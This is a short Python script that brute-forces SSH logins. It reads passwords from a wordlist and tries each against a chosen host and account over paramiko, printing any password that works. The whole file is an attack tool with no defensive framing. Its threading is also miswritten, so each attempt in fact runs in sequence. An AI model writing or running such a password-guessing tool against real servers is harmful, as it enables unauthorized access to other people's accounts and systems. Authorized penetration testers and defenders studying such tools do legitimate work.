import socket,sys,os,termcolor ,paramiko
import threading,time
class bruteforce:
    stop_flag = 0
    def __init__(self,host,username ,input_file):
        self.host = host
        self.username = username
        self.input_file = input_file
    def ssh_connect(self,password):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(self.host, port=22 ,username = self.username,password = password)
                self.stop_flag= 1
                print(termcolor.colored('[+] Found password ' + password + ' for account ' + self.username, 'green'))
            except paramiko.AuthenticationException :
                print(termcolor.colored('[-] Incorrect login ' + password , 'red'))
            ssh.close()

    def connect(self):
            if os.path.exists(self.input_file) == False:
                print('[-] The file does not exist')
                sys.exit(1)

            print('* * * Strating threading bruteforce on '+ self.host +' , with account : '+ self.username + ' * * * ')

            with open(self.input_file,'r') as file:
                for line in file.readlines():
                    if self.stop_flag == 1:
                        t.join()
                        exit( )
                    password = line.strip()
                    t = threading.Thread(target=self.ssh_connect(password))
                    t.start()
                    time.sleep(0.5)
